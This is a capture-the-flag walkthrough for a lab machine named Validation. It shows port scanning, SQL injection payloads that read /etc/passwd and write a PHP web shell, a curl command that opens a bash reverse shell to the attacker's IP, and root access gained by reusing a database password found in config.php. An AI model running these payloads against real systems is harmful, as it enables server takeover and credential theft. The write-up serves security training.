---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Validation





```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.116 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 16:07 CET
Initiating SYN Stealth Scan at 16:07
Scanning 10.10.11.116 [65535 ports]
Discovered open port 22/tcp on 10.10.11.116
Discovered open port 8080/tcp on 10.10.11.116
Discovered open port 80/tcp on 10.10.11.116
Discovered open port 4566/tcp on 10.10.11.116
Completed SYN Stealth Scan at 16:07, 18.90s elapsed (65535 total ports)
Nmap scan report for 10.10.11.116
Host is up, received user-set (0.070s latency).
Scanned at 2025-02-13 16:07:11 CET for 19s
Not shown: 65522 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 62
4566/tcp open  kwtc       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.02 seconds
           Raw packets sent: 67055 (2.950MB) | Rcvd: 67117 (2.691MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.116
	[*] Open ports: 22,80,4566,8080

[*] Ports copied to clipboard
```





```bash
❯ nmap -sCV -p22,80,4566,8080 10.10.11.116 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 16:07 CET
Nmap scan report for 10.10.11.116
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   121.14 ms 10.10.16.1
2   46.79 ms  10.10.11.116

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.30 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/4906_vmware_m0Tp36XLAS.png" alt=""><figcaption></figcaption></figure>



```bash
❯ whatweb http://10.10.11.116/
http://10.10.11.116/ [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
```



<figure><img src="../../.gitbook/assets/imagen (337).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (338).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (339).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (340).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (341).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (342).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (343).png" alt=""><figcaption></figcaption></figure>



```sql
'UNION SELECT 1;-- -
```



<figure><img src="../../.gitbook/assets/imagen (344).png" alt=""><figcaption></figcaption></figure>



```sql
'UNION SELECT USER();-- -
```

<figure><img src="../../.gitbook/assets/imagen (345).png" alt=""><figcaption></figcaption></figure>



```sql
'UNION SELECT DATABASE();-- -
```



<figure><img src="../../.gitbook/assets/imagen (346).png" alt=""><figcaption></figcaption></figure>





```sql
'UNION SELECT VERSION();-- -
```

<figure><img src="../../.gitbook/assets/imagen (347).png" alt=""><figcaption></figcaption></figure>



```sql
'UNION SELECT LOAD_FILE('/etc/passwd');-- -
```

<figure><img src="../../.gitbook/assets/imagen (348).png" alt=""><figcaption></figcaption></figure>





```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/gzzcoo.php";-- -
```



<figure><img src="../../.gitbook/assets/4920_vmware_akX6HTC6Sp.png" alt=""><figcaption></figcaption></figure>





```bash
❯ curl -s 'http://10.10.11.116/gzzcoo.php?cmd=whoami'
www-data
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```sql
❯ curl -s "http://10.10.11.116/gzzcoo.php?cmd=/bin/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.16.7/443%200>%261'"
```





```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.116] 35532
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ cat /home/htb/user.txt 
034c3ec9bef6ff9b13b0fc256bc395a5
```





```bash
www-data@validation:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@validation:/var/www/html$ sudo -l
bash: sudo: command not found
```



```bash
www-data@validation:/var/www/html$ ls -l
total 36
-rw-r--r-- 1 www-data www-data  1550 Sep  2  2021 account.php
-rw-r--r-- 1 www-data www-data   191 Sep  2  2021 config.php
drwxr-xr-x 1 www-data www-data  4096 Sep  2  2021 css
-rw-r--r-- 1 www-data www-data 16833 Sep 16  2021 index.php
drwxr-xr-x 1 www-data www-data  4096 Sep 16  2021 js
www-data@validation:/var/www/html$ cat config.php 
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```





```bash
www-data@validation:/var/www/html$ su root
Password: 
root@validation:/var/www/html$ cat /root/root.txt 
00b9b6d3f6502d1056765e46a0788cb7
```
